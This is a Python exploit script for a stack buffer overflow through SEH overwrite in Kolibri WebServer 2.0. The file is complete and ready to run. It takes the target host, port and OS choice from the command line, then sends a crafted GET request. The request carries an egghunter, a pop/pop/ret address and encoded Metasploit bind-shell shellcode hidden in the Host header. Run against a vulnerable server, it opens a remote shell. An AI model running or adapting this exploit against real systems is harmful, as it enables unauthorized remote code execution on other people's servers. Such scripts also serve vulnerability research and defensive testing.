#!/usr/bin/python
# Exploit Title		: Kolibri WebServer 2.0 Get Request SEH Exploit
# Exploit Author	: Revin Hadi S
# Date			: 14/07/2014
# Vendor		: http://www.senkas.com
# Version		: 2.0
# Tested on 		: Windows XP SP2 Eng, Windows Server 2003 Eng, Win 7 SP1 Eng
import socket, sys

help = \"\"\"Kolibri WebServer 2.0 Get Request SEH Exploit

Target
[1]Windows XP SP2 Eng & Windows 2003 SP2 Eng
[2]Windows 7 SP1 Eng

Usage : %s [rhost] [port] [target]\"\"\" %sys.argv[0]

try:
	script, rhost, port, target = sys.argv
except ValueError:
	print help
	exit()

try:
	port = int(port)
	target = int(target)
except ValueError:
	print \"Port & Target should number !\"
	exit() 

#msfpayload windows/shell_bind_tcp LPORT=5698 R | msfencode -a x86 -e x86/alpha_mixed -t c
shellcode = (\"\\x89\\xe2\\xd9\\xc4\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\x49\\x49\"
\"\\x49\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43\\x37\\x51\\x5a\\x6a\"
\"\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\\x42\\x32\"
\"\\x42\\x42\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\"
\"\\x39\\x6c\\x79\\x78\\x6f\\x79\\x75\\x50\\x57\\x70\\x53\\x30\\x65\\x30\\x6f\"
\"\\x79\\x68\\x65\\x50\\x31\\x69\\x42\\x71\\x74\\x6c\\x4b\\x43\\x62\\x46\\x50\"
\"\\x6e\\x6b\\x61\\x42\\x74\\x4c\\x6c\\x4b\\x66\\x32\\x35\\x44\\x4e\\x6b\\x33\"
\"\\x42\\x64\\x68\\x66\\x6f\\x6c\\x77\\x51\\x5a\\x37\\x56\\x75\\x61\\x79\\x6f\"
\"\\x30\\x31\\x49\\x50\\x6e\\x4c\\x65\\x6c\\x73\\x51\\x53\\x4c\\x45\\x52\\x46\"
\"\\x4c\\x67\\x50\\x49\\x51\\x48\\x4f\\x56\\x6d\\x53\\x31\\x38\\x47\\x39\\x72\"
\"\\x4a\\x50\\x72\\x72\\x36\\x37\\x4e\\x6b\\x62\\x72\\x54\\x50\\x6c\\x4b\\x43\"
\"\\x72\\x55\\x6c\\x36\\x61\\x6e\\x30\\x6e\\x6b\\x33\\x70\\x72\\x58\\x6e\\x65\"
\"\\x39\\x50\\x52\\x54\\x50\\x4a\\x47\\x71\\x6e\\x30\\x32\\x70\\x4c\\x4b\\x72\"
\"\\x68\\x35\\x48\\x4e\\x6b\\x50\\x58\\x45\\x70\\x45\\x51\\x4e\\x33\\x6d\\x33\"
\"\\x35\\x6c\\x43\\x79\\x4c\\x4b\\x64\\x74\\x4c\\x4b\\x57\\x71\\x49\\x46\\x55\"
\"\\x61\\x79\\x6f\\x50\\x31\\x6f\\x30\\x4e\\x4c\\x39\\x51\\x48\\x4f\\x44\\x4d\"
\"\\x37\\x71\\x59\\x57\\x64\\x78\\x79\\x70\\x53\\x45\\x69\\x64\\x76\\x63\\x33\"
\"\\x4d\\x79\\x68\\x37\\x4b\\x53\\x4d\\x45\\x74\\x30\\x75\\x58\\x62\\x30\\x58\"
\"\\x4c\\x4b\\x31\\x48\\x67\\x54\\x36\\x61\\x78\\x53\\x53\\x56\\x6c\\x4b\\x74\"
\"\\x4c\\x50\\x4b\\x4c\\x4b\\x53\\x68\\x47\\x6c\\x36\\x61\\x48\\x53\\x6c\\x4b\"
\"\\x76\\x64\\x4c\\x4b\\x73\\x31\\x4a\\x70\\x4b\\x39\\x33\\x74\\x61\\x34\\x47\"
\"\\x54\\x33\\x6b\\x71\\x4b\\x70\\x61\\x50\\x59\\x52\\x7a\\x50\\x51\\x4b\\x4f\"
\"\\x6d\\x30\\x31\\x48\\x43\\x6f\\x53\\x6a\\x6c\\x4b\\x66\\x72\\x38\\x6b\\x6c\"
\"\\x46\\x53\\x6d\\x70\\x68\\x34\\x73\\x36\\x52\\x33\\x30\\x53\\x30\\x52\\x48\"
\"\\x72\\x57\\x50\\x73\\x45\\x62\\x53\\x6f\\x76\\x34\\x51\\x78\\x72\\x6c\\x62\"
\"\\x57\\x46\\x46\\x47\\x77\\x79\\x6f\\x78\\x55\\x78\\x38\\x4e\\x70\\x35\\x51\"
\"\\x45\\x50\\x53\\x30\\x35\\x79\\x6a\\x64\\x31\\x44\\x76\\x30\\x71\\x78\\x61\"
\"\\x39\\x6d\\x50\\x50\\x6b\\x35\\x50\\x49\\x6f\\x6a\\x75\\x32\\x70\\x30\\x50\"
\"\\x72\\x70\\x66\\x30\\x61\\x50\\x36\\x30\\x31\\x50\\x50\\x50\\x51\\x78\\x68\"
\"\\x6a\\x64\\x4f\\x69\\x4f\\x59\\x70\\x4b\\x4f\\x38\\x55\\x4b\\x39\\x38\\x47\"
\"\\x44\\x71\\x79\\x4b\\x43\\x63\\x31\\x78\\x37\\x72\\x67\\x70\\x52\\x36\\x47\"
\"\\x32\\x6f\\x79\\x4a\\x46\\x72\\x4a\\x72\\x30\\x46\\x36\\x50\\x57\\x52\\x48\"
\"\\x79\\x52\\x79\\x4b\\x74\\x77\\x30\\x67\\x59\\x6f\\x58\\x55\\x46\\x33\\x61\"
\"\\x47\\x53\\x58\\x6e\\x57\\x69\\x79\\x65\\x68\\x59\\x6f\\x59\\x6f\\x69\\x45\"
\"\\x46\\x33\\x30\\x53\\x76\\x37\\x50\\x68\\x74\\x34\\x78\\x6c\\x47\\x4b\\x48\"
\"\\x61\\x6b\\x4f\\x4a\\x75\\x43\\x67\\x4d\\x59\\x38\\x47\\x65\\x38\\x61\\x65\"
\"\\x70\\x6e\\x70\\x4d\\x61\\x71\\x79\\x6f\\x39\\x45\\x70\\x68\\x31\\x73\\x50\"
\"\\x6d\\x31\\x74\\x67\\x70\\x6f\\x79\\x39\\x73\\x32\\x77\\x52\\x77\\x70\\x57\"
\"\\x66\\x51\\x68\\x76\\x73\\x5a\\x54\\x52\\x46\\x39\\x63\\x66\\x69\\x72\\x69\"
\"\\x6d\\x61\\x76\\x4a\\x67\\x33\\x74\\x76\\x44\\x65\\x6c\\x55\\x51\\x73\\x31\"
\"\\x6c\\x4d\\x43\\x74\\x31\\x34\\x32\\x30\\x4a\\x66\\x67\\x70\\x57\\x34\\x56\"
\"\\x34\\x36\\x30\\x30\\x56\\x56\\x36\\x30\\x56\\x43\\x76\\x42\\x76\\x32\\x6e\"
\"\\x71\\x46\\x36\\x36\\x70\\x53\\x46\\x36\\x55\\x38\\x33\\x49\\x78\\x4c\\x37\"
\"\\x4f\\x6b\\x36\\x49\\x6f\\x49\\x45\\x4b\\x39\\x59\\x70\\x50\\x4e\\x31\\x46\"
\"\\x50\\x46\\x49\\x6f\\x50\\x30\\x42\\x48\\x36\\x68\\x4e\\x67\\x35\\x4d\\x73\"
\"\\x50\\x6b\\x4f\\x59\\x45\\x6f\\x4b\\x4c\\x30\\x48\\x35\\x4f\\x52\\x33\\x66\"
\"\\x63\\x58\\x6d\\x76\\x5a\\x35\\x6f\\x4d\\x6f\\x6d\\x69\\x6f\\x58\\x55\\x77\"
\"\\x4c\\x63\\x36\\x33\\x4c\\x56\\x6a\\x6b\\x30\\x69\\x6b\\x4d\\x30\\x53\\x45\"
\"\\x45\\x55\\x4f\\x4b\\x70\\x47\\x52\\x33\\x44\\x32\\x52\\x4f\\x51\\x7a\\x63\"
\"\\x30\\x66\\x33\\x6b\\x4f\\x78\\x55\\x41\\x41\")

#egghunter\'s tag : doge
egghunter = (\"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\"
\"\\xef\\xb8\\x64\\x6f\\x67\\x65\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\")

if target == 1:
	buff = 792
elif target == 2:
	buff = 794
else:
	print \"Input Target option\'s number !\"
	exit()

buffer = \"\\x90\"*(buff-20-32-4)
buffer += egghunter
buffer += \"\\x90\"*20
buffer += \"\\xEB\\xBA\\x90\\x90\"
buffer += \"\\xC2\\x15\\x40\"		#/p/p/r kolibri.exe

eggshell = \"dogedoge\"+shellcode

evil = (
\"GET /\"+buffer+\" HTTP/1.1\\r\\n\"
\"Host: \"+eggshell+\"\\r\\n\"
\"User-Agent: kepo\\r\\n\"
\"Connection: close\\r\\n\\r\\n\")

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((rhost, port))
except socket.error:
	print \"[!]Host down or unreachable !\"
	exit()
s.send(evil)
s.close()

print \"Exploit sended ! Wait a minute the egghunter may take a while to find the tag...\"
